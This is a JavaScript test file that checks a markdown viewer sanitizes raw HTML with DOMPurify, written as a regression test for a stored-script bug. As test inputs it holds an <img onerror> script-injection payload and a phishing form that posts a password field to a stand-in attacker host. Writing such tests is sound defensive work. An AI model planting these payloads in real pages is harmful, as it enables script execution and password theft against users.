// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import DOMPurify from "dompurify";
import { renderMarkdownInto } from "../../lib/viewer.js";

// TestRenderMarkdownSanitizesRawHtml is the P0-4 regression: marked v9's
// parse() passes raw HTML embedded in a markdown file straight through
// unchanged, so a file containing `<img src=x onerror="...">` would execute
// script the moment a user viewed it (netdisk.js and share.js both used to
// assign marked.parse(text) directly to innerHTML). renderMarkdownInto must
// run the parsed HTML through the real DOMPurify before it ever reaches the
// DOM, so the onerror handler (and a <form> phishing injection) never survive.
describe("renderMarkdownInto", () => {
  let body;

  beforeEach(() => {
    body = document.createElement("div");
    document.body.appendChild(body);
    window.DOMPurify = DOMPurify;
  });

  afterEach(() => {
    document.body.innerHTML = "";
    delete window.marked;
    delete window.DOMPurify;
    vi.unstubAllGlobals();
  });

  it("strips an <img onerror> that marked passed through as raw HTML", async () => {
    const malicious = '<h1>hi</h1>\n<img src="x" onerror="window.pwned = true">';
    window.marked = { parse: () => malicious };
    vi.stubGlobal("fetch", vi.fn(async () => ({ text: async () => "irrelevant, marked is stubbed" })));

    await renderMarkdownInto("/x.md", body);

    const rendered = body.querySelector(".viewer-markdown").innerHTML;
    expect(rendered).not.toContain("onerror");
    expect(rendered).toContain("<h1>hi</h1>");
    expect(window.pwned).toBeUndefined();
  });

  it("strips a <form> phishing injection", async () => {
    window.marked = { parse: () => '<p>Notice</p><form action="https://evil.example/steal"><input name="password"></form>' };
    vi.stubGlobal("fetch", vi.fn(async () => ({ text: async () => "irrelevant" })));

    await renderMarkdownInto("/x.md", body);

    const rendered = body.querySelector(".viewer-markdown").innerHTML;
    expect(rendered).not.toContain("<form");
    expect(rendered).toContain("<p>Notice</p>");
  });

  it("falls back to plain text (never renders raw HTML) when DOMPurify failed to load", async () => {
    delete window.DOMPurify;
    window.marked = { parse: () => '<img src="x" onerror="window.pwned = true">' };
    vi.stubGlobal("fetch", vi.fn(async () => ({ text: async () => "source text" })));

    await renderMarkdownInto("/x.md", body);

    expect(body.querySelector(".viewer-markdown")).toBeNull();
    expect(body.querySelector("pre").textContent).toBe("source text");
    expect(window.pwned).toBeUndefined();
  });
});
